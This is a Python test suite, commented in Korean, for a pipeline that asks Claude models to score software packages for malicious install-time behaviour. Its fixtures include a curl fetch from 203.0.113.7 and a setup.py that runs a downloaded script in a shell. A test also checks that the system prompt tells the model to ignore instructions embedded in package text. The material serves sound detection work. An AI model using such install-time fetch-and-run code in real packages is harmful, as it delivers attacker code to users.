    def test_schema_sent_to_the_api_uses_only_supported_keywords(self):
        banned = {"minimum", "maximum", "multipleOf", "minLength", "maxLength", "maxItems", "pattern", "exclusiveMinimum", "exclusiveMaximum"}

        def walk(node):
            if isinstance(node, dict):
                self.assertFalse(banned & set(node), node)
                if node.get("type") == "object":
                    self.assertIs(node["additionalProperties"], False)
                    self.assertEqual(sorted(node["required"]), sorted(node["properties"]))
                for v in node.values():
                    walk(v)
            elif isinstance(node, list):
                for v in node:
                    walk(v)

        walk(L.ANALYSIS_SCHEMA)
        self.assertEqual(set(L.ANALYSIS_SCHEMA["properties"]), {
            "risk_score", "risk_level", "detected_tags", "attack_narrative_ko", "evidence", "benign_explanation_ko", "confidence", "recommended_action_ko",
            "rationale_ko"})
        self.assertIn("NONE", L.TAGS)


class Truncation(unittest.TestCase):
    def test_long_text_is_cut_and_marked(self):
        client = FakeClient({HAIKU: message(analysis(5))})
        row = one(client, text="A" * 5000, max_chars=1000)
        sent = client.calls[0]["messages"][0]["content"]
        self.assertEqual((row["truncated"], row["inputChars"]), (True, 5000))
        self.assertIn("A" * 1000, sent)
        self.assertNotIn("A" * 1001, sent)
        self.assertIn("절삭", sent)
        self.assertIn("5,000", sent)  # 원래 길이를 모델에게 알린다

    def test_short_text_is_sent_whole_and_not_marked(self):
        client = FakeClient({HAIKU: message(analysis(5))})
        row = one(client, text="B" * 1000, max_chars=1000)
        self.assertEqual((row["truncated"], row["inputChars"]), (False, 1000))
        self.assertNotIn("절삭", client.calls[0]["messages"][0]["content"])

    def test_default_cap_fits_the_context_window_in_the_worst_case(self):
        # 근거: 글자 하나는 UTF-8 로 4바이트 이하, 토큰 수 <= 바이트 수 → 가장 나쁜 경우에도 100만 토큰 창 안
        prompt = L.load_prompt()
        user = L.render_user(prompt, "\U0001F600" * L.MAX_TEXT_CHARS, {"x": "y" * 10_000}, True)
        request = L.build_request(OPUS, prompt, user)
        self.assertLess(L.bound_input_tokens(request) + L.MAX_TOKENS, 1_000_000)

    def test_text_that_cannot_be_encoded_is_made_safe(self):
        client = FakeClient({HAIKU: message(analysis(5))})
        row = one(client, text="ok \ud800 tail")  # 짝 없는 대리 문자
        self.assertEqual(row["status"], "OK")
        client.calls[0]["messages"][0]["content"].encode("utf-8")  # 던지지 않는다


class Request(unittest.TestCase):
    def setUp(self):
        self.client = FakeClient({HAIKU: message(analysis(70)), OPUS: message(analysis(70))})
        self.row = one(self.client, "sample-id-XYZ")
        self.prompt = L.load_prompt()

    def test_shape_follows_the_current_api(self):
        for request, model in zip(self.client.calls, (HAIKU, OPUS)):
            self.assertEqual(request["model"], model)
            self.assertEqual(request["max_tokens"], L.MAX_TOKENS)
            # 시스템 프롬프트에 프롬프트 캐시
            self.assertEqual(request["system"], [{"type": "text", "text": self.prompt["system"], "cache_control": {"type": "ephemeral"}}])
            self.assertEqual(request["thinking"], {"type": "adaptive"})
            self.assertEqual(request["output_config"]["effort"], L.EFFORT[model])
            self.assertEqual(request["output_config"]["format"], {"type": "json_schema", "schema": L.ANALYSIS_SCHEMA})
            self.assertEqual([m["role"] for m in request["messages"]], ["user"])
            # 지금 모델이 거부하는 것 · 이 평가에서 쓰지 않는 것
            for gone in ("temperature", "top_p", "top_k", "tool_choice", "tools", "fallbacks", "betas", "metadata"):
                self.assertNotIn(gone, request)

    def test_only_package_text_and_static_summary_are_sent(self):
        sent = json.dumps(self.client.calls, ensure_ascii=False)
        self.assertIn("curl http://203.0.113.7/x", sent)
        self.assertIn("threat-setup-exec", sent)
        self.assertNotIn("sample-id-XYZ", sent)  # 표본 id 는 보내지 않는다
        for private in (os.path.expanduser("~"), os.environ.get("USER") or "\0", HERE):
            self.assertNotIn(private, sent)

    def test_local_home_path_is_not_sent_even_if_another_layer_leaves_it_in(self):
        home = os.path.expanduser("~")
        client = FakeClient({HAIKU: message(analysis(5))})
        one(client, text=f"=== {home}/work/store/ab12/setup.py ===\nimport os\n", static={"file": f"{home}/work/store/ab12/setup.py"})
        sent = json.dumps(client.calls, ensure_ascii=False)
        self.assertNotIn(home, sent)
        self.assertIn("~/work/store/ab12/setup.py", sent)

    def test_answer_with_unencodable_text_is_still_written(self):
        with tempfile.TemporaryDirectory() as d:
            results = L.Results(os.path.join(d, "out.jsonl"))
            client = FakeClient({HAIKU: message(analysis(5, attack_narrative_ko="끊긴 글자 \ud83d"))})
            batch([{"id": "a", "text": TEXT, "static": STATIC}], client, results)
            self.assertEqual(L.Results(results.path).rows["a"]["status"], "OK")

    def test_row_records_prompt_and_input_hashes(self):
        self.assertEqual(self.row["promptSha256"], self.prompt["sha256"])
        self.assertEqual(self.row["inputSha256"], hashlib.sha256(self.client.calls[0]["messages"][0]["content"].encode()).hexdigest())
        self.assertEqual(self.row["cacheKey"], L.cache_key(self.row["promptSha256"], self.row["inputSha256"]))
        self.assertEqual(self.row["pipeline"], L.PIPELINE)
        for key in ("id", "status", "riskScore", "tags", "confidence", "model", "stages", "costUsd", "promptSha256", "inputSha256", "ms", "error", "analysis"):
            self.assertIn(key, self.row)
        for key in ("model", "status", "riskScore", "inputTokens", "outputTokens", "cacheReadTokens", "cacheWriteTokens", "costUsd"):
            self.assertIn(key, self.row["stages"][0])
        json.dumps(self.row)  # 그대로 JSONL 한 줄이 된다


class PromptFile(unittest.TestCase):
    def test_file_is_valid_json_with_the_agreed_keys(self):
        for path, version in ((L.PROMPT_PATH, 2), (L.PROMPT_V1_PATH, 1)):
            with self.subTest(version=version):
                with open(path, "rb") as f:
                    raw = f.read()
                data = json.loads(raw)
                self.assertEqual(set(data), {"name", "version", "system", "user_template"})
                self.assertEqual((data["name"], data["version"]), ("package", version))
                self.assertEqual(os.path.relpath(path, HERE), os.path.join("prompts", f"package-v{version}.json"))
                self.assertEqual(L.load_prompt(path)["sha256"], hashlib.sha256(raw).hexdigest())
                for slot in ("{static_block}", "{truncated_note}", "{package_text}"):
                    self.assertIn(slot, data["user_template"])

    def test_v2_is_the_default_and_both_versions_are_pinned(self):
        self.assertEqual(os.path.basename(L.PROMPT_PATH), "package-v2.json")
        self.assertEqual(L.load_prompt()["sha256"], PROMPT_V2_SHA256)
        self.assertEqual(L.load_prompt(L.PROMPT_V1_PATH)["sha256"], PROMPT_V1_SHA256)  # v1 은 그대로 둔다

    def test_judgement_criteria_are_carried_over_and_commit_wording_is_gone(self):
        for path in (L.PROMPT_PATH, L.PROMPT_V1_PATH):
            system = L.load_prompt(path)["system"]
            for kept in ("방어 보안 분석가", "[주요 탐지 대상]", "[오탐 억제 지침", "두 요소의 결합", "90~100", "70~89", "40~69", "10~39", "0~9", '["NONE"]'):
                self.assertIn(kept, system)
            for gone in ("Diff", "커밋", "report_analysis", "GitHub"):
                self.assertNotIn(gone, system)
            for gone in ("{sha}", "{repo}", "{message}", "{diff}", "{author}"):
                self.assertNotIn(gone, L.load_prompt(path)["user_template"])

    def test_v2_adds_only_the_untrusted_text_rule_and_the_rationale_rule(self):
        v1, v2 = L.load_prompt(L.PROMPT_V1_PATH), L.load_prompt()
        self.assertEqual(v1["user_template"], v2["user_template"])
        self.assertNotIn("따르지 않습니다", v1["system"])
        # 패키지 안의 글(주석 · 문자열 · README)에 든 지시는 따르지 않는다, 분석 대상일 뿐
        for part in ("주석", "문자열", "README", "따르지 않습니다", "분석 대상일 뿐"):
            self.assertIn(part, v2["system"])
        self.assertIn("rationale_ko", v2["system"])
        self.assertIn("1~3문장", v2["system"])
        for line in v1["system"].splitlines():  # v1 의 줄은 모두 남아 있다(덧붙이기만 했다)
            self.assertIn(line, v2["system"])

    def test_budget_matches_the_protocol(self):
        with open(os.path.join(HERE, "protocol.json"), encoding="utf-8") as f:
            llm = json.load(f)["layers"]["llm"]
        self.assertIn(f"${L.BUDGET_USD:g}", llm)


class CliBase(unittest.TestCase):
    """CLI 공통 틀 — 키는 가짜, 분할 · 봉인 기록은 임시 파일(실제 split.json 은 읽지 않는다)."""

    EXTRA = []  # run 에 덧붙이는 인자

    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.inp, self.out = os.path.join(self.dir.name, "in.jsonl"), os.path.join(self.dir.name, "out.jsonl")
        write_jsonl(self.inp, samples(3))
        self.split, self.ledger = os.path.join(self.dir.name, "split.json"), os.path.join(self.dir.name, "unseal-log.json")
        write_split(self.split, {**{f"s{i}": "train" for i in range(9)}, "a": "train", "b": "train",
                                 "t0": "test", "t1": "test", "c0": "calibration"})

    def run_cli(self, argv, *, key=FAKE_KEY, client=None):
        env = {k: v for k, v in os.environ.items() if k != "ANTHROPIC_API_KEY"}
        if key is not None:
            env["ANTHROPIC_API_KEY"] = key
        if argv[0] == "run":
            argv = argv + self.EXTRA
        stdout, stderr = io.StringIO(), io.StringIO()
        with mock.patch.dict(os.environ, env, clear=True), mock.patch.object(L, "make_client", return_value=client) as make, \
                mock.patch.object(L, "SPLIT_PATH", self.split), mock.patch.object(L, "LEDGER_PATH", self.ledger), \
                mock.patch.object(L.time, "sleep", lambda seconds: None), \
                contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            code = L.main(argv)
        return code, stdout.getvalue(), stderr.getvalue(), make


class Cli(CliBase):
    """개발 확인용 실시간 경로(--mode realtime --gate all). 배치 · 관문 · 봉인은 아래 묶음에서 따로 본다."""

    EXTRA = ["--part", "train", "--mode", "realtime", "--gate", "all"]

    def test_refuses_to_run_without_a_key(self):
        client = FakeClient({HAIKU: message(analysis(5))})
        for key in (None, "", "   "):
            code, _, err, make = self.run_cli(["run", "--input", self.inp, "--out", self.out], key=key, client=client)
            self.assertEqual(code, 2)
            self.assertIn("ANTHROPIC_API_KEY", err)
            make.assert_not_called()
        self.assertEqual(client.calls, [])
        self.assertFalse(os.path.exists(self.out))

    def test_key_never_reaches_output_or_results(self):
        # 서버 오류 글에 키가 섞여 와도 남기지 않는다
        client = FakeClient({HAIKU: [ApiError(401, f"invalid x-api-key: {FAKE_KEY}"), message(analysis(5)), ApiError(400, f"bad {FAKE_KEY} request")]})
        code, out, err, make = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--retries", "0"], client=client)
        make.assert_called_once_with(FAKE_KEY)
        self.assertEqual(code, 0)
        with open(self.out, encoding="utf-8") as f:
            written = f.read()
        self.assertEqual(len(written.splitlines()), 3)
        for where in (out, err, written):
            self.assertNotIn(FAKE_KEY, where)
            self.assertNotIn("sk-ant-", where)
        self.assertIn("401", written)  # 상태 코드는 남는다
        _, cost_out, cost_err, _ = self.run_cli(["cost", "--out", self.out])
        self.assertNotIn(FAKE_KEY, cost_out + cost_err)

    def test_run_writes_one_row_per_sample_and_resumes(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out], client=client)
        self.assertEqual((code, len(client.calls)), (0, 3))
        code, _, _, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out], client=client)
        self.assertEqual((code, len(client.calls)), (0, 3))  # 다시 돌려도 더 부르지 않는다
        rows = L.Results(self.out).rows
        self.assertEqual(list(rows), ["s0", "s1", "s2"])
        self.assertIn("$", err)  # 누적 비용을 알린다
        self.assertNotIn("s0", err)  # 진행 줄에는 수와 비용만 — 표본 id · 점수는 화면에 내지 않는다

    def test_no_cache_flag_calls_again_for_the_same_content(self):
        write_jsonl(self.inp, [{"id": "a", "text": TEXT, "static": STATIC}, {"id": "b", "text": TEXT, "static": STATIC}])
        cached = FakeClient({HAIKU: lambda request: message(analysis(5))})
        self.run_cli(["run", "--input", self.inp, "--out", self.out], client=cached)
        self.assertEqual(len(cached.calls), 1)
        fresh = FakeClient({HAIKU: lambda request: message(analysis(5))})
        self.run_cli(["run", "--input", self.inp, "--out", self.out + ".final", "--no-cache"], client=fresh)
        self.assertEqual(len(fresh.calls), 2)

    def test_budget_flag_caps_the_run(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        code, _, _, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--budget", "0"], client=client)
        self.assertEqual((code, client.calls), (0, []))
        self.assertEqual({r["status"] for r in L.Results(self.out).rows.values()}, {"SKIPPED_BUDGET"})

    def test_budget_flag_cannot_raise_the_agreed_cap(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out + ".over", "--budget", "100.01"], client=client)
        self.assertEqual((code, client.calls), (2, []))
        self.assertIn("$100", err)
        self.assertFalse(os.path.exists(self.out + ".over"))

    def test_bad_input_is_rejected_before_any_call(self):
        write_jsonl(self.inp, [{"id": "a", "text": TEXT, "static": STATIC}, {"id": "b", "static": STATIC}])
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out], client=client)
        self.assertEqual((code, client.calls), (2, []))
        self.assertIn("2", err)  # 몇째 줄인지

    def test_run_exits_nonzero_when_stopped_by_repeated_errors(self):
        write_jsonl(self.inp, samples(9))
        client = FakeClient({HAIKU: lambda request: ApiError(401, "invalid x-api-key")})
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out], client=client)
        self.assertEqual((code, len(client.calls)), (3, L.MAX_ERRORS_IN_A_ROW * TRIES))
        self.assertIn("멈", err)

    def test_cost_reads_totals_back_from_the_results_file(self):
        client = FakeClient({HAIKU: [message(analysis(60)), refusal("cyber"), message(analysis(5))], OPUS: [message(analysis(90)), refusal("cyber")]})
        self.run_cli(["run", "--input", self.inp, "--out", self.out], client=client)
        code, out, _, make = self.run_cli(["cost", "--out", self.out], key=None)
        make.assert_not_called()  # 키도 호출도 필요 없다
        report = json.loads(out)
        rows = L.Results(self.out).rows.values()
        self.assertEqual(code, 0)
        self.assertEqual(report["status"], {"OK": 2, "REFUSED": 1})
        self.assertAlmostEqual(report["spentUsd"], sum(r["costUsd"] for r in rows), places=8)
        self.assertEqual(report["calls"], {HAIKU: 3, OPUS: 2})
        self.assertGreater(report["unbilledRefusalUsd"], 0)
        self.assertLess(report["unbilledRefusalUsd"], report["spentUsd"])

    def test_estimate_needs_no_key_and_makes_no_call(self):
        code, out, _, make = self.run_cli(["estimate", "--input", self.inp], key=None)
        make.assert_not_called()
        report = json.loads(out)
        self.assertEqual((code, report["samples"]), (0, 3))
        self.assertLess(report["usd"]["low"], report["usd"]["high"])
        self.assertIn("assumptions", report)


def scored(request):
    """보낸 글 끝의 「# score=N」 을 위험 점수로 돌려주는 답(표본마다 다른 답 — 짝 맞춤 확인용)."""
    content = request["messages"][0]["content"]
    score = int(content.rsplit("score=", 1)[1].split()[0])
    return message(analysis(score))


def scored_samples(*scores, prefix="s"):
    return [{"id": f"{prefix}{i}", "text": f"{TEXT}# score={score}\n", "static": STATIC} for i, score in enumerate(scores)]


def ml_gate(dirname, rows, low=0.2, high=0.5):
    path = os.path.join(dirname, "ml-train.jsonl")
    write_jsonl(path, rows)
    ml, sha = L.read_ml(path)
    return L.Gate("ml", low, high, ml, sha), path


class Rationale(unittest.TestCase):
    def test_rationale_is_kept_on_the_row_for_the_response_screen(self):
        row = one(FakeClient({HAIKU: message(analysis(5))}))
        self.assertEqual(row["rationaleKo"], "setup.py 가 설치 중에 밖에서 받은 스크립트를 셸로 실행합니다.")
        self.assertEqual(row["analysis"]["rationaleKo"], row["rationaleKo"])
        for failed in (one(FakeClient({HAIKU: refusal(), OPUS: refusal()})), one(FakeClient({HAIKU: ApiError(500)}), retries=0)):
            self.assertIsNone(failed["rationaleKo"])

    def test_em_dash_never_reaches_the_screen_text(self):
        reply = message(analysis(80, rationale_ko="setup.py 가 셸을 엽니다 — 그 뒤 203.0.113.7 로 연결합니다.—"))
        row = one(FakeClient({HAIKU: reply, OPUS: reply}))
        self.assertEqual(row["rationaleKo"], "setup.py 가 셸을 엽니다, 그 뒤 203.0.113.7 로 연결합니다.")
        self.assertNotIn("—", json.dumps(row["rationaleKo"], ensure_ascii=False))
        self.assertEqual(L.clean_rationale("— 앞 —뒤—  끝 "), "앞, 뒤, 끝")
        self.assertEqual(L.clean_rationale("정상 설치 스크립트입니다."), "정상 설치 스크립트입니다.")

    def test_a_rationale_that_is_only_dashes_is_an_error(self):
        row = one(FakeClient({HAIKU: message(analysis(5, rationale_ko=" — "))}), retries=0)
        self.assertEqual(row["status"], "ERROR")
        self.assertIn("rationale_ko", row["error"])


class Retries(unittest.TestCase):
    def test_error_is_retried_three_times_with_the_same_request_then_left_as_error(self):
        self.assertEqual(L.MAX_RETRIES, 3)
        client = FakeClient({HAIKU: lambda request: ApiError(500)})
        row = one(client)
        self.assertEqual(len(client.calls), TRIES)
        self.assertTrue(all(call == client.calls[0] for call in client.calls))  # 같은 요청
        self.assertEqual([(s["status"], s["attempt"]) for s in row["stages"]], [("ERROR", i) for i in range(TRIES)])
        self.assertEqual((row["status"], row["riskScore"]), ("ERROR", None))

    def test_success_on_a_retry_ends_the_retries(self):
        client = FakeClient({HAIKU: [ApiError(500), message(text="not json"), message(analysis(5))]})
        row = one(client)
        self.assertEqual(len(client.calls), 3)
        self.assertEqual([s["status"] for s in row["stages"]], ["ERROR", "ERROR", "OK"])
        self.assertEqual((row["status"], row["riskScore"]), ("OK", 5))

    def test_refusal_is_not_retried_and_no_other_model_is_asked(self):
        client = FakeClient({HAIKU: refusal("cyber"), OPUS: refusal("cyber")})
        row = one(client)
        self.assertEqual(client.models(), [HAIKU, OPUS])  # 거부는 다시 하지 않고, 정한 두 모델 밖으로 넘기지 않는다
        self.assertEqual((row["status"], row["error"]), ("REFUSED", "refusal:cyber"))
        for request in client.calls:  # 서버 쪽 대체(fallbacks) · 베타 머리글을 요청하지 않는다
            self.assertNotIn("fallbacks", request)
            self.assertNotIn("betas", request)
            self.assertNotIn("extra_body", request)

    def test_budget_skip_is_not_retried(self):
        client = FakeClient({HAIKU: message(analysis(5))})
        row = one(client, budget=L.Budget(0.0))
        self.assertEqual(([s["status"] for s in row["stages"]], client.calls), (["SKIPPED_BUDGET"], []))


class GateTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.out = os.path.join(self.dir.name, "out.jsonl")

    def test_band_includes_low_and_excludes_high(self):
        self.assertTrue(L.gated(0.2, 0.2, 0.5))
        self.assertTrue(L.gated(0.4999, 0.2, 0.5))
        self.assertFalse(L.gated(0.5, 0.2, 0.5))
        self.assertFalse(L.gated(0.1999, 0.2, 0.5))
        self.assertFalse(L.gated(None, 0.2, 0.5))

    def test_ml_file_is_read_with_its_hash_and_bad_lines_are_refused(self):
        gate, path = ml_gate(self.dir.name, [{"id": "a", "p": 0.25}, {"id": "b", "p": 1}])
        with open(path, "rb") as f:
            self.assertEqual(gate.ml_sha, hashlib.sha256(f.read()).hexdigest())
        self.assertEqual(gate.ml, {"a": 0.25, "b": 1.0})
        self.assertEqual(gate.config(), {"mode": "ml", "low": 0.2, "high": 0.5, "mlSha256": gate.ml_sha})
        bad = {"p 가 글": {"id": "a", "p": "0.3"}, "p 가 범위 밖": {"id": "a", "p": 1.5}, "id 없음": {"p": 0.3},
               "p 가 참거짓": {"id": "a", "p": True}}
        for name, line in bad.items():
            with self.subTest(name):
                write_jsonl(path, [line])
                with self.assertRaises(ValueError):
                    L.read_ml(path)
        write_jsonl(path, [{"id": "a", "p": 0.3}, {"id": "a", "p": 0.4}])
        with self.assertRaises(ValueError):  # 같은 id 가 두 값
            L.read_ml(path)
        with self.assertRaises(ValueError):
            L.Gate("ml", 0.5, 0.5, {}, "x")  # 빈 구간
        with self.assertRaises(ValueError):
            L.Gate("ml", None, 0.5, {}, "x")

    def check_rows(self, rows, gate):
        self.assertEqual({i: r["status"] for i, r in rows.items()}, {"s0": "OK", "s1": "NOT_GATED", "s2": "NOT_GATED"})
        for sid, p in (("s1", 0.5), ("s2", None)):
            r = rows[sid]
            self.assertEqual((r["riskScore"], r["costUsd"], r["stages"], r["model"], r["mlP"]), (None, 0.0, [], None, p))
        self.assertEqual(rows["s0"]["mlP"], 0.2)
        self.assertTrue(all(r["gate"] == gate.config() for r in rows.values()))

    def test_realtime_calls_only_samples_in_the_band(self):
        gate, _ = ml_gate(self.dir.name, [{"id": "s0", "p": 0.2}, {"id": "s1", "p": 0.5}])  # s2 는 ML 결과에 없다
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        batch(samples(3), client, L.Results(self.out), gate=gate)
        self.assertEqual(len(client.calls), 1)
        self.check_rows(L.Results(self.out).rows, gate)

    def test_batch_submits_only_samples_in_the_band(self):
        gate, _ = ml_gate(self.dir.name, [{"id": "s0", "p": 0.2}, {"id": "s1", "p": 0.5}])
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        batches(samples(3), client, L.Results(self.out), gate=gate)
        self.assertEqual([len(reqs) for _, reqs in client.batches.created], [1])
        self.check_rows(L.Results(self.out).rows, gate)

    def test_not_gated_rows_are_finished_and_not_rewritten(self):
        gate, _ = ml_gate(self.dir.name, [{"id": "s1", "p": 0.9}])
        for _ in range(2):
            batch(samples(2), FakeClient({}), L.Results(self.out), gate=gate)
        with open(self.out, encoding="utf-8") as f:
            self.assertEqual([json.loads(x)["status"] for x in f], ["NOT_GATED", "NOT_GATED"])

    def test_a_results_file_made_with_another_gate_is_refused(self):
        gate, _ = ml_gate(self.dir.name, [{"id": "s0", "p": 0.2}])
        batch(samples(1), FakeClient({HAIKU: message(analysis(5))}), L.Results(self.out), gate=gate)
        other = L.Gate("ml", 0.1, 0.5, gate.ml, gate.ml_sha)
        with self.assertRaises(ValueError):
            L.check_results_gate(L.Results(self.out), other)
        with self.assertRaises(ValueError):
            L.check_results_gate(L.Results(self.out), L.Gate("all"))
        L.check_results_gate(L.Results(self.out), gate)  # 같으면 통과


class Batches(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.out = os.path.join(self.dir.name, "out.jsonl")

    def results(self):
        return L.Results(self.out)

    def test_requests_follow_the_batch_shape(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        batches([{"id": "sample-id-XYZ", "text": TEXT, "static": STATIC}], client, self.results())
        (_, requests), = client.batches.created
        (request,) = requests
        self.assertEqual(set(request), {"custom_id", "params"})
        self.assertRegex(request["custom_id"], r"^[A-Za-z0-9_-]{1,64}$")
        self.assertNotIn("sample-id-XYZ", json.dumps(requests))  # 표본 id 는 보내지 않는다
        prompt = L.load_prompt()
        self.assertEqual(request["params"], L.build_request(HAIKU, prompt, L.render_user(prompt, TEXT, STATIC, False)))
        for gone in ("stream", "fallbacks", "betas", "speed"):  # 배치가 받지 않는 것 · 쓰지 않는 것
            self.assertNotIn(gone, request["params"])

    def test_results_are_paired_by_custom_id_not_by_order(self):
        client = FakeClient({HAIKU: scored})
        batches(scored_samples(3, 17, 29, 8), client, self.results())
        rows = self.results().rows
        self.assertEqual({i: r["riskScore"] for i, r in rows.items()}, {"s0": 3, "s1": 17, "s2": 29, "s3": 8})
        self.assertEqual(len(client.batches.created), 1)

    def test_batch_calls_cost_half(self):
        self.assertEqual(L.BATCH_DISCOUNT, 0.5)
        u = usage(inp=900, out=321, write=1500)
        client = FakeClient({HAIKU: lambda request: message(analysis(5), use=u)})
        batches(samples(1), client, self.results())
        stage = self.results().rows["s0"]["stages"][0]
        self.assertTrue(stage["batch"])
        self.assertAlmostEqual(stage["costUsd"], 0.5 * (900 * 0.10 + 321 * 0.50 + 1500 * 0.125) / 1e6, places=8)
        self.assertAlmostEqual(L.worst_case_usd(OPUS, 10_000, batch=True), 0.5 * L.worst_case_usd(OPUS, 10_000), places=12)

    def test_escalation_goes_in_a_second_batch(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(60)), OPUS: lambda request: message(analysis(90))})
        batches(samples(1), client, self.results())
        self.assertEqual([[r["params"]["model"] for r in reqs] for _, reqs in client.batches.created], [[HAIKU], [OPUS]])
        row = self.results().rows["s0"]
        self.assertEqual((row["status"], row["model"], row["riskScore"]), ("OK", OPUS, 90))
        self.assertEqual([(s["model"], s["status"]) for s in row["stages"]], [(HAIKU, "OK"), (OPUS, "OK")])

    def test_errored_and_expired_requests_are_retried_in_new_batches(self):
        client = FakeClient({HAIKU: [ApiError(500, "overloaded"), "expired", message(analysis(5))]})
        batches(samples(1), client, self.results())
        self.assertEqual(len(client.batches.created), 3)
        row = self.results().rows["s0"]
        self.assertEqual([s["status"] for s in row["stages"]], ["ERROR", "ERROR", "OK"])
        self.assertIn("api_error", row["stages"][0]["error"])
        self.assertIn("expired", row["stages"][1]["error"])
        self.assertEqual(row["stages"][0]["costUsd"], 0.0)  # 오류 결과는 usage 가 없다

    def test_after_three_retries_the_sample_stays_an_error(self):
        client = FakeClient({HAIKU: lambda request: ApiError(500)})
        done, _ = batches(samples(2), client, self.results())
        self.assertEqual(len(client.batches.created), TRIES)
        self.assertEqual([len(reqs) for _, reqs in client.batches.created], [2] * TRIES)
        self.assertEqual({r["status"] for r in self.results().rows.values()}, {"ERROR"})
        self.assertEqual(done["made"], 2)

    def test_refusal_in_a_batch_is_recorded_without_fallback(self):
        client = FakeClient({HAIKU: refusal("cyber"), OPUS: refusal("bio")})
        batches(samples(1), client, self.results())
        row = self.results().rows["s0"]
        self.assertEqual([(s["model"], s["status"]) for s in row["stages"]], [(HAIKU, "REFUSED"), (OPUS, "REFUSED")])
        self.assertEqual(row["status"], "REFUSED")
        self.assertEqual(len(client.batches.created), 2)

    def test_budget_holds_the_worst_case_at_batch_price(self):
        rows = samples(2)
        half = haiku_worst(rows[0]["text"]) / 2  # 배치 가격으로 딱 한 건
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        done, budget = batches(rows, client, self.results(), limit_usd=half)
        self.assertEqual([len(reqs) for _, reqs in client.batches.created], [1])
        self.assertEqual({i: r["status"] for i, r in self.results().rows.items()}, {"s0": "OK", "s1": "SKIPPED_BUDGET"})
        self.assertLessEqual(budget.spent, budget.limit)
        self.assertAlmostEqual(budget.held, 0.0, places=12)
        # 같은 금액이 실시간 가격으로는 한 건도 못 부른다
        self.assertEqual(one(FakeClient({HAIKU: message(analysis(5))}), "x", text=rows[0]["text"], budget=L.Budget(half))["status"], "SKIPPED_BUDGET")

    def test_pending_batches_count_against_the_cap_after_a_restart(self):
        server = FakeBatches(ends_after=5)
        rows = samples(2)
        limit = haiku_worst(rows[0]["text"]) / 2 * 1.5
        first = FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server)
        done, _ = batches(rows[:1], first, self.results(), limit_usd=limit, wait=False)
        self.assertTrue(done["pending"])
        # 다시 열어도 아직 받지 않은 배치의 최악 비용이 잡혀 있다 — 두 번째 표본은 들어가지 못한다
        second = FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server)
        _, budget = batches(rows, second, self.results(), limit_usd=limit, wait=False)
        self.assertEqual([len(reqs) for _, reqs in server.created], [1])
        self.assertGreater(budget.held, 0)
        self.assertEqual({i: r["status"] for i, r in self.results().rows.items()}, {"s1": "SKIPPED_BUDGET"})

    def test_resume_collects_the_same_batch_after_an_interruption(self):
        server = FakeBatches(ends_after=1)
        first = FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server)
        done, _ = batches(samples(2), first, self.results(), wait=False)
        self.assertTrue(done["pending"])
        self.assertEqual(self.results().rows, {})
        (batch_id, _), = server.created
        with open(self.out + ".batches.json", encoding="utf-8") as f:
            self.assertIn(batch_id, f.read())
        # 새 프로세스처럼: 같은 배치 id 로 상태를 묻고 결과를 받는다(새로 제출하지 않는다)
        second = FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server)
        done, _ = batches(samples(2), second, self.results(), wait=False)
        self.assertFalse(done["pending"])
        self.assertEqual(len(server.created), 1)
        self.assertEqual(server.retrieved, [batch_id, batch_id])
        self.assertEqual({r["status"] for r in self.results().rows.values()}, {"OK"})
        # 또 돌려도 부르지도 쓰지도 않는다
        before = os.path.getsize(self.out)
        batches(samples(2), second, self.results(), wait=False)
        self.assertEqual((len(server.created), os.path.getsize(self.out)), (1, before))

    def test_identical_inputs_share_one_request(self):
        rows = [{"id": "a", "text": TEXT, "static": STATIC}, {"id": "b", "text": TEXT, "static": STATIC}]
        client = FakeClient({HAIKU: lambda request: message(analysis(22))})
        results = self.results()
        batches(rows, client, results, cache=results.cache())
        self.assertEqual([len(reqs) for _, reqs in client.batches.created], [1])
        final = self.results().rows
        self.assertEqual((final["a"]["status"], final["b"]["status"], final["b"]["cachedFrom"], final["b"]["riskScore"]), ("OK", "CACHED", "a", 22))

    def test_a_failed_submit_stops_the_run_and_releases_the_hold(self):
        client = FakeClient({HAIKU: message(analysis(5))})

        def refuse(**kw):
            raise ApiError(401, f"invalid x-api-key {FAKE_KEY}")
        client.batches.create = refuse
        done, budget = batches(samples(2), client, self.results())
        self.assertIn("401", done["stopped"])
        self.assertNotIn(FAKE_KEY, done["stopped"])
        self.assertEqual((budget.held, self.results().rows), (0.0, {}))

    def test_rationale_comes_through_batches(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5, rationale_ko="정상 설치 스크립트입니다 — 네트워크 호출이 없습니다."))})
        batches(samples(1), client, self.results())
        self.assertEqual(self.results().rows["s0"]["rationaleKo"], "정상 설치 스크립트입니다, 네트워크 호출이 없습니다.")


class Sealed(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.split, self.ledger = os.path.join(self.dir.name, "split.json"), os.path.join(self.dir.name, "unseal-log.json")
        write_split(self.split, {"a": "train", "t": "test", "r": "reserve", "c": "calibration"})

    def check(self, part, ids):
        return L.check_part(part, ids, split_path=self.split, ledger_path=self.ledger)

